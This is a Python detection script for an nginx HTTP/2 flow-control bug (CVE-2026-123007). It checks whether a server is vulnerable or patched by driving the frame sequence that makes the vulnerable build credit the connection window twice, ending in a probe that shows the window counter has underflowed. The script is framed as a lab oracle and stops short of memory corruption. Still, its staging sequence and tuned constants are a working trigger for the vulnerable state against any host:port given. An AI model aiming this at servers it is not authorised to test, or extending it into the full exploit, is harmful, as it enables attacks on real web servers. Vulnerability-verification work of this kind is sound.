#!/usr/bin/env python3
"""Safe differential oracle for CVE-2026-123007 (NGINX2Root).

Drives nginx's connection-level HTTP/2 flow-control accounting through
the sequence that makes the vulnerable build credit the connection
window twice for the same queued DATA:

  1. handshake advertising SETTINGS_INITIAL_WINDOW_SIZE = 0
  2. open N streams (GET /big.bin) — bodies pending, nothing sendable
  3. raise the connection send window to NGX_HTTP_V2_MAX_WINDOW (2^31-1)
  4. grant each stream credit: nginx builds DATA frames until the socket
     stalls; with many streams the per-stream staged chunks leave
     several MiB of DATA queued in nginx's outbound queue while we read
     nothing (kernel backpressure; no PING flood — a flood trips nginx's
     10000-frame cap with FRAME_SIZE_ERROR on both builds)
  5. first-return stream-0 WINDOW_UPDATE of R bytes: credit handed back
     while most of that DATA is still queued, followed by a strictly
     bounded drain (FIRST_RETURN_DRAIN_CAP) that flushes the peer's
     staging send buffer — the only window in which the patched build's
     termination is observable: its FIN sits behind the clogged socket
       vulnerable: capacity check is  window > MAX - send_window
                   (queued-but-unsent DATA is invisible) — accepted, the
                   bounded drain just sees queued DATA keep flowing
       patched:    check counts send_queued — capacity is only the
                   bytes actually sent, so the frame is rejected with
                   FLOW_CONTROL_ERROR and the connection terminates; the
                   clean EOF (GOAWAY is lost behind the userspace-queued
                   DATA) surfaces during the bounded drain
  6. RST_STREAM every stream; the drain then makes each stream's writer
     fail with "output on closed stream", the request is freed and
     ngx_http_v2_filter_cleanup returns the still-queued DATA credit
     AGAIN (no upper-bound check in 1.31.8)
       vulnerable: send_window = 2^31 - 1 + (R - sent) > MAX
  7. probe: one oversized stream-0 WINDOW_UPDATE
       vulnerable → MAX - send_window underflows (size_t), frame
                    ACCEPTED, the tagged PING is answered
       patched    → already terminated at step 5

Verdict rules (phase tracking, R3-reset-mislabel): the probe runs in
four labeled phases — staging / first-return / rst-drain / probe. Only a
termination CAUSED BY the first-return WINDOW_UPDATE may be classified
PATCHED: a clean peer EOF (FIN) or GOAWAY FLOW_CONTROL_ERROR surfaced
during the first-return phase's bounded drain. A TCP-state check alone
cannot make that call — while the socket is clogged the FIN cannot
arrive — so the bounded drain is what attributes the death. Death or
reset observed in any other phase returns UNCLEAR naming the phase: on
the vulnerable build it can mean a worker died mid-probe, and that must
never be reported as "patched".

With --confirm (R3-env-constants), every PATCHED verdict is re-run
against the same target with double the streams; a target that survives
the confirm run is downgraded to UNCLEAR ("insufficient staging on
first attempt").

Exit code is 0 only if every target ends in {VULNERABLE, PATCHED,
NOT-H2}; any UNCLEAR or ERROR target makes it 1. Each target is probed
in isolation (R3-target-isolation): one bad target cannot abort the
others.

This oracle never drives the out-of-bounds copy: no memory is
corrupted on either side. Run inside the lab's probe container:

    docker compose exec probe python /poc/diagnose.py [--confirm] [host:port ...]
"""

from __future__ import annotations

import argparse
import re
import socket
import sys
import time

from h2lib import (
    DATA,
    GOAWAY,
    H2Client,
    H2_MAX_WINDOW,
    PING,
    FLAG_ACK,
    ERR_FLOW_CONTROL_ERROR,
)

# --- staging constants ----------------------------------------------------

N_STREAMS = 120          # under nginx's default http2_max_concurrent_streams (128)
GRANT_PER_STREAM = 256 << 10  # credit per stream; staged DATA stalls at ~64 KiB/stream

# FIRST_RETURN invariant (R3-env-constants): the first stream-0 WINDOW_UPDATE
# must be strictly larger than everything the kernel drains away during
# staging PLUS the bounded first-return drain (otherwise even the patched
# build accepts it), yet not larger than the DATA still queued in nginx at
# the moment of the WINDOW_UPDATE (otherwise even the vulnerable build
# rejects it with FLOW_CONTROL_ERROR):
#
#   (max plausible kernel drain + first-return drain cap)
#       < FIRST_RETURN <= (min queued DATA)
#
# Measured in this lab (120 streams x 256 KiB grants, SO_RCVBUF pinned to
# 64 KiB): the kernel-drained share — rcvbuf + nginx's socket send buffer —
# is 0.74-1.05 MiB per run, and the staged queue holds ~8.5 MiB at the
# WINDOW_UPDATE. The first-return drain cap below adds 1.5 MiB, so the
# lower edge is ~2.65 MiB. 4 MiB sits inside the gap on both sides
# (~1.35 MiB below-side / ~4.5 MiB above-side margin).
#
# Note: 2 MiB — inside the raw staging gap — was considered, but the
# phase-tracking first-return drain (R3-reset-mislabel) necessarily reads
# up to the cap on the vulnerable path too, which pushes the lower edge to
# ~2.65 MiB; at 2 MiB the vulnerable build's double credit goes negative
# and the oracle would misclassify it. If staging parameters change,
# re-measure both edges and re-check this.
FIRST_RETURN = 4 << 20

# The first-return phase bounded drain: enough to flush the peer's staging
# send-buffer (observed <= 1.05 MiB) and surface a FIN sent at the
# WINDOW_UPDATE, small enough to keep the vulnerable build's staged queue
# (and its cleanup credit) mostly intact.
FIRST_RETURN_DRAIN_CAP = (3 << 20) // 2  # 1.5 MiB
FIRST_RETURN_DRAIN_IDLE = 1.0          # s of socket idleness ends the drain

# How long the patched build gets to terminate after the first-return
# WINDOW_UPDATE before the bounded drain looks for its FIN.
FIRST_RETURN_SETTLE = 0.4

PROBE_INCREMENT = 1 << 20
PROBE_PING = b"probe001"  # exactly 8 bytes: a PING of any other length is SIZE_ERROR

# --- phase labels (R3-reset-mislabel) --------------------------------------
# A PATCHED verdict requires the peer's death to be observed AT the
# first-return WINDOW_UPDATE (peer FIN/RST right after that frame — checked
# via TCP state so nothing has to be drained — or a GOAWAY
# FLOW_CONTROL_ERROR). A death observed in any other phase is reported as
# UNCLEAR naming the phase: on the vulnerable build it can mean a worker
# died mid-probe, and that must never be sold as "patched".

PHASE_STAGING = "staging"
PHASE_FIRST_RETURN = "first-return"
PHASE_RST_DRAIN = "rst-drain"
PHASE_PROBE = "probe"

WORKER_DEATH_HINT = "possible worker death on the vulnerable build"

# --- target syntax (R3-target-isolation) -----------------------------------

TARGET_RE = re.compile(
    r"^(?P<host>[A-Za-z0-9](?:[A-Za-z0-9._-]*[A-Za-z0-9])?|\[[0-9A-Fa-f:.]+\])"
    r":(?P<port>[0-9]{1,5})$"
)

GOOD_VERDICTS = ("VULNERABLE", "PATCHED", "NOT-H2")


def parse_target(spec: str) -> tuple[str, int]:
    """Validate one `host:port` target; raise ValueError with a clear message."""
    m = TARGET_RE.match(spec)
    if m is None:
        raise ValueError(f"invalid target {spec!r}: expected host:port")
    port = int(m["port"])
    if not 1 <= port <= 65535:
        raise ValueError(f"invalid target {spec!r}: port must be 1-65535")
    host = m["host"]
    if host.startswith("["):  # bracketed IPv6 literal
        host = host[1:-1]
    return host, port


def server_settings_seen(frames: list[dict]) -> bool:
    return any(f["type"] == 4 and not f["flags"] & FLAG_ACK for f in frames)


def summarize(frames: list[dict]) -> dict[int, int]:
    counts: dict[int, int] = {}
    for f in frames:
        counts[f["type"]] = counts.get(f["type"], 0) + 1
    return counts


def goaway_of(frames: list[dict]):
    return next((f for f in frames if f["type"] == GOAWAY), None)


def death_result(verdict: str, phase: str, ev: list[str], how: str) -> dict:
    """UNCLEAR-style result for a connection death outside first-return."""
    hint = "" if phase == PHASE_FIRST_RETURN else f"; {WORKER_DEATH_HINT}"
    return {"verdict": verdict, "phase": phase, "evidence": ev + [f"{how} during {phase} phase{hint}"]}


def probe_target(host: str, port: int, streams: int = N_STREAMS) -> dict:
    ev: list[str] = []
    phase = PHASE_STAGING
    c: H2Client | None = None
    try:
        c = H2Client(host, port)  # inside the try: connect errors are per-target
        hs = c.handshake(initial_window=0)
        if not server_settings_seen(hs):
            head = c.buf[:64] if c.buf else b"<no bytes>"
            return {"verdict": "NOT-H2", "phase": phase,
                    "evidence": [f"no server SETTINGS; first bytes: {head!r}"]}
        ev.append("handshake ok (initial window 0)")

        sids = [1 + 2 * i for i in range(streams)]
        for sid in sids:
            c.open_stream(sid, "/big.bin", f"{host}:{port}")
        ev.append(f"opened {streams} streams (GET /big.bin)")

        # connection window -> NGX_HTTP_V2_MAX_WINDOW, then stage + queue the
        # DATA; do NOT read: kernel backpressure must keep frames in nginx's
        # outbound queue until the RST cleanup runs.
        c.window_update(0, H2_MAX_WINDOW - 65535)
        for sid in sids:
            c.window_update(sid, GRANT_PER_STREAM)
        time.sleep(0.6)
        ev.append(f"granted {streams}x{GRANT_PER_STREAM >> 10} KiB "
                  "(DATA staged, socket stalled by not reading)")

        # --- first return: credit for DATA that is still queued -------------
        phase = PHASE_FIRST_RETURN
        c.window_update(0, FIRST_RETURN)
        # Give the patched build time to terminate (FLOW_CONTROL_ERROR), then
        # perform the strictly bounded drain: the peer's FIN cannot arrive
        # while the socket is clogged, so reading — bounded by
        # FIRST_RETURN_DRAIN_CAP, roughly the staging send-buffer flush — is
        # the only way to attribute a death to the WINDOW_UPDATE itself. On
        # the vulnerable build the same drain just lets queued DATA flow and
        # stops at the cap (the FIRST_RETURN invariant accounts for it).
        time.sleep(FIRST_RETURN_SETTLE)
        c.fill(FIRST_RETURN_DRAIN_IDLE, cap=FIRST_RETURN_DRAIN_CAP)
        frames = c.parse_buffered()
        flushed = sum(f["len"] for f in frames if f["type"] == DATA)
        goaway = goaway_of(frames)
        if goaway is not None and goaway.get("error") == ERR_FLOW_CONTROL_ERROR:
            ev.append(
                f"first return {FIRST_RETURN >> 20} MiB on stream 0: GOAWAY "
                f"FLOW_CONTROL_ERROR (last_sid={goaway.get('last_sid')}) — the "
                "patched capacity check rejected the credit"
            )
            return {"verdict": "PATCHED", "phase": phase, "evidence": ev}
        if c.eof:
            ev.append(
                f"first return {FIRST_RETURN >> 20} MiB on stream 0: clean peer "
                f"EOF (FIN) after {flushed} bytes — exactly the staging "
                "send-buffer flush, so the peer had already terminated at the "
                "WINDOW_UPDATE (GOAWAY lost behind the clogged userspace queue; "
                "the patched capacity check counts queued-but-unsent DATA)"
            )
            return {"verdict": "PATCHED", "phase": phase, "evidence": ev}
        if c.reset:
            return death_result("UNCLEAR", phase, ev,
                                "connection reset (RST) surfaced during the "
                                "bounded first-return drain")
        ev.append(
            f"first return {FIRST_RETURN >> 20} MiB on stream 0 accepted — no "
            f"FIN within the {FIRST_RETURN_DRAIN_CAP >> 10} KiB bounded drain "
            f"({flushed} bytes of queued DATA kept flowing, TCP "
            f"{c.peer_state_name()}), connection alive"
        )

        # --- RST drain: the double-credit window ----------------------------
        phase = PHASE_RST_DRAIN
        # The connection was proven alive at the end of the first-return
        # check, so a send failure here is a mid-probe death — attributed to
        # this phase, never to the first-return WINDOW_UPDATE.
        try:
            for sid in sids:
                c.rst(sid)
        except OSError as exc:
            return death_result("UNCLEAR", phase, ev,
                                f"send failed while sending RST_STREAMs ({exc!r})")
        ev.append(f"RST all {streams} streams")

        # A connection that survives to here was alive past the first-return
        # check — RSTs cancel the streams, and the drain makes each stream's
        # writer fail ("output on closed stream") so the cleanups return the
        # queued DATA credit a second time (vulnerable only).
        time.sleep(0.4)
        c.fill(2.0)
        frames = c.parse_buffered()
        data_bytes = sum(f["len"] for f in frames if f["type"] == DATA)
        ev.append(
            f"post-RST drain: {summarize(frames)}, DATA={data_bytes} bytes "
            "(queued DATA was reclaimed by cleanup, only the drained share arrives)"
        )
        goaway = goaway_of(frames)
        if goaway is not None:
            err = goaway.get("error")
            ev.append(f"GOAWAY error={err} last_sid={goaway.get('last_sid')}")
            if err == ERR_FLOW_CONTROL_ERROR:
                # GOAWAY FLOW_CONTROL_ERROR is definitive PATCHED evidence in
                # any phase: only the capacity check emits it.
                return {"verdict": "PATCHED", "phase": phase, "evidence": ev}
        if c.reset:
            return death_result("UNCLEAR", phase, ev,
                                "connection reset by peer (RST) observed at drain")
        if c.eof:
            # R3-reset-mislabel: a clean EOF here used to be reported as
            # PATCHED. Without a GOAWAY we cannot attribute the close to the
            # first-return check, so this must stay UNCLEAR.
            return death_result("UNCLEAR", phase, ev,
                                "clean EOF from peer (no GOAWAY) observed at drain")

        # --- the probe: an oversized stream-0 WINDOW_UPDATE + a tagged PING --
        phase = PHASE_PROBE
        try:
            c.window_update(0, PROBE_INCREMENT)
            c.ping(PROBE_PING)
        except OSError as exc:
            return death_result("UNCLEAR", phase, ev,
                                f"send failed at probe ({exc!r})")
        time.sleep(0.3)
        c.fill(1.5)
        frames = c.parse_buffered()
        ev.append(f"post-probe frames: {summarize(frames) or 'none'}")
        probed = any(
            f["type"] == PING and f["flags"] & FLAG_ACK and f["payload"] == PROBE_PING
            for f in frames
        )
        goaway = goaway_of(frames)
        if goaway is not None:
            ev.append(f"GOAWAY error={goaway.get('error')} last_sid={goaway.get('last_sid')}")
        if probed:
            ev.append("probe PING answered after oversized WINDOW_UPDATE "
                      "(capacity check underflowed: send_window > 2^31-1)")
            return {"verdict": "VULNERABLE", "phase": phase, "evidence": ev}
        if goaway is not None and goaway.get("error") == ERR_FLOW_CONTROL_ERROR:
            return {"verdict": "PATCHED", "phase": phase, "evidence": ev}
        if c.reset:
            return death_result("UNCLEAR", phase, ev,
                                "connection reset by peer (RST) at probe")
        if c.eof:
            return death_result("UNCLEAR", phase, ev,
                                "clean EOF from peer (no GOAWAY) at probe")
        return {"verdict": "UNCLEAR", "phase": phase, "evidence": ev}
    except (socket.timeout, TimeoutError):
        return death_result("UNCLEAR", phase, ev, "timeout")
    except (ConnectionResetError, BrokenPipeError):
        return death_result("UNCLEAR", phase, ev, "connection reset by peer")
    except (OSError, ValueError) as exc:
        # per-target ERROR (R3-target-isolation): connect failures, DNS,
        # malformed responses — the remaining targets still run.
        return {"verdict": "ERROR", "phase": phase,
                "error": f"{type(exc).__name__}: {exc}", "evidence": ev}
    finally:
        if c is not None:
            c.close()


def confirm_patch(host: str, port: int, streams: int) -> dict:
    """Re-run a PATCHED target with double the streams (R3-env-constants).

    Returns the decorated original result: confirmed on a second death at
    first-return, downgraded to UNCLEAR "insufficient staging" if it survives.
    """
    ev = [f"confirm run: {streams * 2} streams"]
    again = probe_target(host, port, streams=streams * 2)
    for line in again["evidence"]:
        ev.append(f"  confirm: {line}")
    if again["verdict"] == "PATCHED":
        return {"verdict": "PATCHED", "phase": again["phase"], "evidence": ev,
                "confirmed_streams": (streams, streams * 2)}
    return {"verdict": "UNCLEAR", "phase": again["phase"],
            "evidence": ev + [f"insufficient staging on first attempt "
                              f"(confirm run with {streams * 2} streams returned "
                              f"{again['verdict']})"]}


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument(
        "targets",
        nargs="*",
        default=["vuln:8080", "fixed:8080", "mitigated:8080"],
        help="host:port pairs (default: the three lab services)",
    )
    ap.add_argument(
        "--confirm",
        action="store_true",
        help="after a PATCHED verdict, re-run that target with double the "
             "streams; survives -> UNCLEAR 'insufficient staging on first "
             "attempt' (default: off)",
    )
    args = ap.parse_args()

    rc = 0
    for spec in args.targets:
        try:
            host, port = parse_target(spec)
        except ValueError as exc:
            print(f"[{spec}] ERROR: {exc}")
            rc = 1
            continue
        try:
            result = probe_target(host, port)
            streams = N_STREAMS
            if args.confirm and result["verdict"] == "PATCHED":
                result = confirm_patch(host, port, streams)
        except (OSError, ValueError) as exc:
            result = {"verdict": "ERROR", "phase": "-", "evidence": [],
                      "error": f"{type(exc).__name__}: {exc}"}

        verdict = result["verdict"]
        line = verdict
        if verdict == "PATCHED" and "confirmed_streams" in result:
            n, n2 = result["confirmed_streams"]
            line = f"PATCHED (confirmed, {n} and {n2} streams)"
        elif verdict == "ERROR":
            line = f"ERROR: {result.get('error', 'unknown error')}"
        print(f"[{spec}] {line}")
        if result.get("phase") and result["phase"] != "-":
            print(f"    - phase: {result['phase']}")
        for e in result["evidence"]:
            print(f"    - {e}")
        if verdict not in GOOD_VERDICTS:
            rc = 1
    return rc


if __name__ == "__main__":
    sys.exit(main())
